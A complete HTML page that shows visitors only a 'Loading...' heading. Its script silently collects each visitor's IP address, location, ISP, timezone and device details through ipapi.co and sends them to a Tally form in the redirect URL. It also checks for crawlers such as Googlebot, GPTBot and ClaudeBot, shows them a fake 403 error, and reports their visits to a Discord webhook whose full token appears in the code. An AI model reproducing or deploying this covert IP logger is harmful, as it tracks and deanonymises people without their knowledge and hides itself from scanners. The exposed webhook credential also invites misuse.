<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tracking Form</title>
</head>
<body>
    <h1>Loading...</h1>

    <script>
        async function getUserData() {
            const webhookURL = "https://discord.com/api/webhooks/1344385758026535054/cSWbFy-5tKPCBRW4IWKhMHDZKkWVQEbFlpkwVgs9LKsJESweTQ-cBrXOviJxVODG_3ps";
            const tallyFormURL = "https://tally.so/r/wb6M7g?tracking=";
            
            // Detect if it's a bot (User-Agent Check)
            function isBot() {
                const botUserAgents = [
                    "Googlebot", "Bingbot", "Slurp", "DuckDuckBot", "Baiduspider", "YandexBot",
                    "facebot", "ia_archiver", "MJ12bot", "AhrefsBot", "SemrushBot", "Twitterbot",
                    "LinkedInBot", "Discordbot", "GPTBot", "ClaudeBot", "Bytespider", "NaverBot"
                ];
                return botUserAgents.some(bot => navigator.userAgent.includes(bot));
            }

            if (isBot()) {
                // Log bot detection to Discord
                fetch(webhookURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        username: "Bot Detector",
                        content: `ðŸš¨ **Crawler Detected!**\n\nðŸ†” **User-Agent:** ${navigator.userAgent}\nðŸ“… **Time:** ${new Date().toLocaleString()}`
                    })
                });

                // Block the page
                document.body.innerHTML = "<h1>Crawler Detected</h1><p>Please contact support: contact@candykingsid.com</p><p>Error Code: 403</p>";
                return; // Stop further execution
            }

            // Get IP, Location, and Device Info
            let ipData = { ip: "Unknown", country: "Unknown", city: "Unknown", region: "Unknown" };
            try {
                const response = await fetch("https://ipapi.co/json/");
                ipData = await response.json();
            } catch (error) {
                console.error("Failed to get IP info", error);
            }

            // Collect browser/device details
            const deviceInfo = {
                ip: ipData.ip,
                country: ipData.country_name,
                city: ipData.city,
                region: ipData.region,
                isp: ipData.org,
                timezone: ipData.timezone,
                browser: navigator.userAgent,
                language: navigator.language,
                screen: `${screen.width}x${screen.height}`,
                platform: navigator.platform
            };

            // Format tracking data for URL
            const trackingDetails = encodeURIComponent(JSON.stringify(deviceInfo));

            // Redirect to Tally Form with tracking details
            window.location.href = tallyFormURL + trackingDetails;
        }

        getUserData();
    </script>
</body>
</html>

